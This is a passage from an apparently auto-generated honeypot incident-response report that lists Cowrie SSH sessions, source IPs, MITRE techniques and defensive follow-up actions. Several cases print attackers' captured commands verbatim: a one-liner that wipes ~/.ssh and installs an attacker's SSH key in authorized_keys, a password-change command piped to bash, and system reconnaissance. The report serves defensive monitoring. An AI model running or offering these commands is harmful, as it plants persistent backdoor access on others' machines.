| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:51:16` | `cowrie.session.connect` |
| `2026-10-29 03:51:16` | `cowrie.client.version` |
| `2026-10-29 03:51:16` | `cowrie.client.kex` |
| `2026-10-29 03:51:16` | `cowrie.login.success` |
| `2026-10-29 03:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.244.60[.]241` to AbuseIPDB if not already reported
- [ ] Block `173.244.60[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f27bfa87de0

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]55` |
| **First Seen** | 2026-10-29 03:51 |
| **Last Seen** | 2026-10-29 03:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:51:30` | `cowrie.session.connect` |
| `2026-10-29 03:51:30` | `cowrie.client.version` |
| `2026-10-29 03:51:30` | `cowrie.client.kex` |
| `2026-10-29 03:51:30` | `cowrie.login.success` |
| `2026-10-29 03:51:31` | `cowrie.session.params` |
| `2026-10-29 03:51:31` | `cowrie.command.input` |
| `2026-10-29 03:51:31` | `cowrie.command.failed` |
| `2026-10-29 03:51:32` | `cowrie.log.closed` |
| `2026-10-29 03:51:33` | `cowrie.session.params` |
| `2026-10-29 03:51:33` | `cowrie.command.input` |
| `2026-10-29 03:51:33` | `cowrie.session.file_download` |
| `2026-10-29 03:51:33` | `cowrie.log.closed` |
| `2026-10-29 03:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]55` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45502d530357

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]55` |
| **First Seen** | 2026-10-29 03:51 |
| **Last Seen** | 2026-10-29 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:51:33` | `cowrie.session.connect` |
| `2026-10-29 03:51:33` | `cowrie.client.version` |
| `2026-10-29 03:51:33` | `cowrie.client.kex` |
| `2026-10-29 03:51:34` | `cowrie.login.success` |
| `2026-10-29 03:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]55` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0628f862c7d9

| Field | Detail |
|---|---|
| **Source IP** | `118.145.228[.]55` |
| **First Seen** | 2026-10-29 03:52 |
| **Last Seen** | 2026-10-29 03:53 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "123456\nOJhIFlombJVO\nOJhIFlombJVO"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:52:53` | `cowrie.session.connect` |
| `2026-10-29 03:52:56` | `cowrie.client.version` |
| `2026-10-29 03:52:56` | `cowrie.client.kex` |
| `2026-10-29 03:52:57` | `cowrie.login.success` |
| `2026-10-29 03:52:59` | `cowrie.session.params` |
| `2026-10-29 03:52:59` | `cowrie.command.input` |
| `2026-10-29 03:52:59` | `cowrie.command.failed` |
| `2026-10-29 03:52:59` | `cowrie.log.closed` |
| `2026-10-29 03:53:00` | `cowrie.session.params` |
| `2026-10-29 03:53:00` | `cowrie.command.input` |
| `2026-10-29 03:53:00` | `cowrie.session.file_download` |
| `2026-10-29 03:53:00` | `cowrie.log.closed` |
| `2026-10-29 03:53:17` | `cowrie.session.params` |
| `2026-10-29 03:53:17` | `cowrie.command.input` |
| `2026-10-29 03:53:17` | `cowrie.log.closed` |
| … | _49 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `118.145.228[.]55` to AbuseIPDB if not already reported
- [ ] Block `118.145.228[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21772ea0123a

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-10-29 03:57 |
| **Last Seen** | 2026-10-29 03:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:57:47` | `cowrie.session.connect` |
| `2026-10-29 03:57:47` | `cowrie.client.version` |
| `2026-10-29 03:57:48` | `cowrie.client.kex` |
| `2026-10-29 03:57:48` | `cowrie.login.success` |
| `2026-10-29 03:57:49` | `cowrie.session.params` |
| `2026-10-29 03:57:49` | `cowrie.command.input` |
| `2026-10-29 03:57:49` | `cowrie.command.failed` |
| `2026-10-29 03:57:49` | `cowrie.log.closed` |
| `2026-10-29 03:57:49` | `cowrie.session.params` |
| `2026-10-29 03:57:49` | `cowrie.command.input` |
| `2026-10-29 03:57:49` | `cowrie.session.file_download` |
| `2026-10-29 03:57:49` | `cowrie.log.closed` |
| `2026-10-29 03:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91313e7e0c23

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-10-29 03:57 |
| **Last Seen** | 2026-10-29 03:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:57:49` | `cowrie.session.connect` |
| `2026-10-29 03:57:49` | `cowrie.client.version` |
| `2026-10-29 03:57:49` | `cowrie.client.kex` |
| `2026-10-29 03:57:50` | `cowrie.login.success` |
| `2026-10-29 03:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fee607a1257

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]61` |
| **First Seen** | 2026-10-29 03:59 |
| **Last Seen** | 2026-10-29 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:59:42` | `cowrie.session.connect` |
| `2026-10-29 03:59:42` | `cowrie.client.version` |
| `2026-10-29 03:59:42` | `cowrie.client.kex` |
| `2026-10-29 03:59:42` | `cowrie.login.success` |
| `2026-10-29 03:59:43` | `cowrie.session.params` |
| `2026-10-29 03:59:43` | `cowrie.command.input` |
| `2026-10-29 03:59:43` | `cowrie.log.closed` |
| `2026-10-29 03:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e3d99ad18b8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-29 04:00 |
| **Last Seen** | 2026-10-29 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 04:00:50` | `cowrie.session.connect` |
| `2026-10-29 04:00:50` | `cowrie.client.version` |
| `2026-10-29 04:00:50` | `cowrie.client.kex` |
| `2026-10-29 04:00:50` | `cowrie.login.success` |
| `2026-10-29 04:00:51` | `cowrie.session.params` |
| `2026-10-29 04:00:51` | `cowrie.command.input` |
| `2026-10-29 04:00:51` | `cowrie.log.closed` |
| `2026-10-29 04:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3a143ab4323

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]111` |
| **First Seen** | 2026-10-29 04:00 |
| **Last Seen** | 2026-10-29 04:01 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 04:00:50` | `cowrie.session.connect` |
| `2026-10-29 04:00:51` | `cowrie.client.version` |
| `2026-10-29 04:00:51` | `cowrie.client.kex` |
| `2026-10-29 04:00:55` | `cowrie.login.success` |
| `2026-10-29 04:00:59` | `cowrie.session.params` |
| `2026-10-29 04:00:59` | `cowrie.command.input` |
| `2026-10-29 04:00:59` | `cowrie.command.failed` |
| `2026-10-29 04:01:00` | `cowrie.log.closed` |
| `2026-10-29 04:01:01` | `cowrie.session.params` |
| `2026-10-29 04:01:01` | `cowrie.command.input` |
| `2026-10-29 04:01:01` | `cowrie.session.file_download` |
| `2026-10-29 04:01:01` | `cowrie.log.closed` |
| `2026-10-29 04:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]111` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5f3e55c369

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]111` |
| **First Seen** | 2026-10-29 04:01 |
| **Last Seen** | 2026-10-29 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 04:01:01` | `cowrie.session.connect` |
| `2026-10-29 04:01:01` | `cowrie.client.version` |
| `2026-10-29 04:01:01` | `cowrie.client.kex` |
| `2026-10-29 04:01:02` | `cowrie.login.success` |
| `2026-10-29 04:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]111` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617f522a012b

| Field | Detail |
|---|---|
| **Source IP** | `178.253.95[.]34` |
| **First Seen** | 2026-10-29 04:05 |
| **Last Seen** | 2026-10-29 04:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 04:05:08` | `cowrie.session.connect` |
| `2026-10-29 04:05:08` | `cowrie.client.version` |
| `2026-10-29 04:05:08` | `cowrie.client.kex` |
| `2026-10-29 04:05:09` | `cowrie.login.success` |
| `2026-10-29 04:05:10` | `cowrie.session.params` |
| `2026-10-29 04:05:10` | `cowrie.command.input` |
| `2026-10-29 04:05:10` | `cowrie.command.failed` |
| `2026-10-29 04:05:10` | `cowrie.log.closed` |
| `2026-10-29 04:05:11` | `cowrie.session.params` |
| `2026-10-29 04:05:11` | `cowrie.command.input` |
| `2026-10-29 04:05:11` | `cowrie.session.file_download` |
| `2026-10-29 04:05:11` | `cowrie.log.closed` |
| `2026-10-29 04:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.253.95[.]34` to AbuseIPDB if not already reported
- [ ] Block `178.253.95[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8b0b02374f

| Field | Detail |
|---|---|
| **Source IP** | `178.253.95[.]34` |
| **First Seen** | 2026-10-29 04:05 |
| **Last Seen** | 2026-10-29 04:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 04:05:11` | `cowrie.session.connect` |
| `2026-10-29 04:05:11` | `cowrie.client.version` |
| `2026-10-29 04:05:11` | `cowrie.client.kex` |
| `2026-10-29 04:05:12` | `cowrie.login.success` |
| `2026-10-29 04:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.253.95[.]34` to AbuseIPDB if not already reported
- [ ] Block `178.253.95[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68c79dae1786

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-10-29 04:07 |
| **Last Seen** | 2026-10-29 04:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 04:07:47` | `cowrie.session.connect` |
| `2026-10-29 04:07:47` | `cowrie.client.version` |
| `2026-10-29 04:07:47` | `cowrie.client.kex` |
| `2026-10-29 04:07:47` | `cowrie.login.success` |
| `2026-10-29 04:07:49` | `cowrie.direct-tcpip.request` |
| `2026-10-29 04:07:49` | `cowrie.direct-tcpip.ja4` |
| `2026-10-29 04:07:49` | `cowrie.direct-tcpip.data` |
| `2026-10-29 04:07:50` | `cowrie.direct-tcpip.request` |
| `2026-10-29 04:07:55` | `cowrie.direct-tcpip.ja4` |
| `2026-10-29 04:07:55` | `cowrie.direct-tcpip.data` |
| `2026-10-29 04:07:56` | `cowrie.direct-tcpip.request` |
| `2026-10-29 04:07:57` | `cowrie.direct-tcpip.ja4` |
| `2026-10-29 04:07:57` | `cowrie.direct-tcpip.data` |
| `2026-10-29 04:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (269) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-5ca4ed5cedeb | HIGH | `138.226.239[.]233` | 2026-10-29 04:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f81eb0cc89de | HIGH | `176.53.159[.]196` | 2026-10-29 04:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c4bb5af0aca1 | HIGH | `92.118.39[.]49` | 2026-10-29 04:38 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-756e00120b35 | HIGH | `92.118.39[.]49` | 2026-10-29 04:40 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-839fcdc5014d | HIGH | `92.118.39[.]49` | 2026-10-29 04:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c8903d1eef0d | HIGH | `92.118.39[.]49` | 2026-10-29 04:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-adebac75f165 | HIGH | `92.118.39[.]49` | 2026-10-29 04:47 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f2340ba5f1f2 | HIGH | `129.121.142[.]84` | 2026-10-29 04:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-20b42bc12792 | HIGH | `129.121.142[.]84` | 2026-10-29 04:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1d9f3b3a03de | HIGH | `91.144.158[.]231` | 2026-10-29 04:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3e8c61f9e865 | HIGH | `91.144.158[.]231` | 2026-10-29 04:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3f7442179aa3 | HIGH | `119.28.46[.]114` | 2026-10-29 05:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-58acf58bee29 | HIGH | `119.28.46[.]114` | 2026-10-29 05:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bf064f81e773 | HIGH | `20.184.59[.]236` | 2026-10-29 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2d18754e2de3 | HIGH | `20.184.59[.]236` | 2026-10-29 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d24f4f2cc6a9 | HIGH | `152.32.189[.]59` | 2026-10-29 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-af4d21ecb8d7 | HIGH | `152.32.189[.]59` | 2026-10-29 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fd5efdb07e86 | HIGH | `50.6.243[.]128` | 2026-10-29 05:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e7b3538b814a | HIGH | `50.6.243[.]128` | 2026-10-29 05:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f8f30db44f46 | HIGH | `62.193.91[.]121` | 2026-10-29 05:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cbc8bc66e237 | HIGH | `62.193.91[.]121` | 2026-10-29 05:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e42c5c7e5b2 | HIGH | `198.251.76[.]9` | 2026-10-29 05:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a3edf2be7fa5 | HIGH | `198.251.76[.]9` | 2026-10-29 05:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4624465c9673 | HIGH | `103.165.227[.]178` | 2026-10-29 05:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-34f5fa99aede | HIGH | `103.165.227[.]178` | 2026-10-29 05:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d4ddca40f77c | HIGH | `45.78.202[.]217` | 2026-10-29 05:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dfbf8c9f4d9d | HIGH | `45.78.202[.]217` | 2026-10-29 05:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b374ee1160e0 | HIGH | `202.46.28[.]140` | 2026-10-29 05:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-89fea4791b73 | HIGH | `202.46.28[.]140` | 2026-10-29 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f800d8e85ee8 | HIGH | `197.5.145[.]150` | 2026-10-29 05:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-baa900b7a250 | HIGH | `197.5.145[.]150` | 2026-10-29 05:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db9742c048c8 | HIGH | `115.190.253[.]92` | 2026-10-29 05:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0929e5a428fb | HIGH | `115.190.253[.]92` | 2026-10-29 05:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aa31cf9d0001 | HIGH | `118.196.114[.]236` | 2026-10-29 05:22 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-21454c7af037 | HIGH | `223.123.16[.]151` | 2026-10-29 05:27 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7cbaf82f81cc | HIGH | `66.228.62[.]150` | 2026-10-29 05:41 | Y | 0 | 0 | `T1078` |
| IR-1d94494461f5 | HIGH | `43.110.31[.]0` | 2026-10-29 05:42 | Y | 10 | 0 | `T1003.008 · T1059.004 · T1078` |
| IR-4cad15e0c47a | HIGH | `194.180.11[.]186` | 2026-10-29 05:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7cdae4366149 | HIGH | `194.180.11[.]186` | 2026-10-29 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1764bc8d8419 | HIGH | `129.121.101[.]166` | 2026-10-29 05:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-93136aac7fa0 | HIGH | `129.121.101[.]166` | 2026-10-29 05:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8a943bca5197 | HIGH | `43.163.103[.]76` | 2026-10-29 05:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e19456cd46b1 | HIGH | `43.163.103[.]76` | 2026-10-29 05:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ad0450490865 | HIGH | `50.6.204[.]202` | 2026-10-29 05:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c680e05a792e | HIGH | `50.6.204[.]202` | 2026-10-29 05:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-34182cc88a9e | HIGH | `80.251.156[.]20` | 2026-10-29 05:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-05eb7150bdde | HIGH | `80.251.156[.]20` | 2026-10-29 05:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de7bda3b75a9 | HIGH | `50.6.202[.]204` | 2026-10-29 05:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-737389c9bcd5 | HIGH | `50.6.202[.]204` | 2026-10-29 05:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a8d44eceb9f | HIGH | `82.39.86[.]153` | 2026-10-29 05:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aa2e8f6a9faa | HIGH | `82.39.86[.]153` | 2026-10-29 05:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f45141f04d65 | HIGH | `180.76.250[.]204` | 2026-10-29 05:55 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-8717e8e75017 | HIGH | `50.6.193[.]166` | 2026-10-29 05:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4a9b5bd85253 | HIGH | `50.6.193[.]166` | 2026-10-29 05:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-86ebb11513c3 | HIGH | `129.121.117[.]162` | 2026-10-29 06:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-21406db04811 | HIGH | `129.121.117[.]162` | 2026-10-29 06:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-82fe036839a8 | HIGH | `176.53.159[.]196` | 2026-10-29 06:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5ec418c3264c | HIGH | `80.94.95[.]118` | 2026-10-29 06:14 | Y | 0 | 0 | `T1078 · T1592` |
